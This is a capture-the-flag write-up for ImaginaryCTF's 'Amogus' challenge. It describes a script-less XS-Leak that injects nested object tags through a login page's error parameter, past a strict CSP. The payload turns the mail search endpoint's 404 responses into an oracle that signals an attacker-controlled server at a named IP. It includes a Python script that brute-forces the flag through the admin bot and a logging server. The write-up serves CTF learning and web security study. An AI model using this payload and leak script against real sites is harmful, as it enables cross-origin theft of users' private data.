# Amogus (14 Solves)

Amogus was an XS-Leak challenge from ImaginaryCTF with a **strict** CSP to block any potential XSS. CSP was being set by employing Nginx to setup a response header: 

```
add_header Content-Security-Policy "sandbox allow-forms allow-same-origin; img-src *; default-src none; style-src 'self'; script-src none; object-src http: https:; frame-src http: https:;" always;
```

# Limited XSS in auth.supersus.corp

The endpoint allows us to inject arbitary code by employing the ```/?error= ```
```python
@app.route('/', methods=["GET", "POST"])
def login():
    if request.method == "GET":
        error = request.args.get("error", "")
        return make_response(env.get_template("login.html").render(error=error))
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        user = User.query.filter_by(username=username).first()

        if user and user.password == password:
            return redirect(f"http://mail.supersus.corp/auth?auth={password}")
        else:
            error = "Invalid username or password."
            return redirect(url_for("login", error=error))
```


# The Exploit Technique

Our core technique is script-less, abusing the ```object-src``` CSP directive. Since the search endpoint on **auth.supersus.corp** will return a 404 if the char was not found, we can use it as an oracle:

```python
@app.route("/emails/<int:user_id>")
def view_emails(user_id):
    user = User.query.get_or_404(user_id)

    if not "auth" in request.cookies or request.cookies["auth"] != user.password:
        return "Unauthorized", 404

    keyword = request.args.get("search", "")
```

By using the following script-less payload:

```js
http://auth.supersus.corp/?error="><object data="http://mail.supersus.corp/emails/1?search=ictf{"><object data="http://VPS/?error"></object></object>
```

In this case if ```http://mail.supersus.corp/emails/1?search=ictf{NOTFOUND``` is not found we will get a hit on our attacker controlled domain.


# Leaking the flag

Now that we have an oracle for our search, I came up with the following script to leak the flag char by char. 
```python
from pwn import *
import string
import time
import requests

url = "http://VPS/log.txt"
base_payload = 'http://auth.supersus.corp/?error="><object data="http://mail.supersus.corp/emails/1?search={}"><object data="http://52.39.251.152:8080/{}"></object></object>'

charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}"
flag = "ictf{"

while True:
    for char in charset:
        temp_flag = flag + char
        print(f'trying {temp_flag}')
        payload = base_payload.format(temp_flag, temp_flag)
        r = remote("amogus-admin-bot.chal.imaginaryctf.org", 1337)
        print(r.recv())
        r.sendline(payload)
        time.sleep(2)
        # check if it's found or not
        try:
            x = requests.get(url).text
            if temp_flag not in x:
                flag += char
                print(flag)
                break
        except Exception as e:
            print("Error:", e)

```

From the server side, I made a simple Python http server which appends to a text file each time there's an 404: 

```python
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler, test
import sys

class CORSRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'text/html')
        SimpleHTTPRequestHandler.end_headers(self)

    def send_error(self, code, message=None, explain=None):
        if code == 404:
            self.log_error("404 Not Found: %s", self.path)
            self.log_message("path is not correct (not found): %s", self.path)
            with open('log.txt', 'a') as log_file:
                log_file.write(f"{self.path}\n")

        super().send_error(code, message, explain)

if __name__ == '__main__':
    test(CORSRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
```

It took a while to run but eventually we got the flag

![image](https://github.com/ixSly/CTFs/assets/32583633/a1b6aa75-d7a5-4a02-b5d0-6d0fabaabcc8)


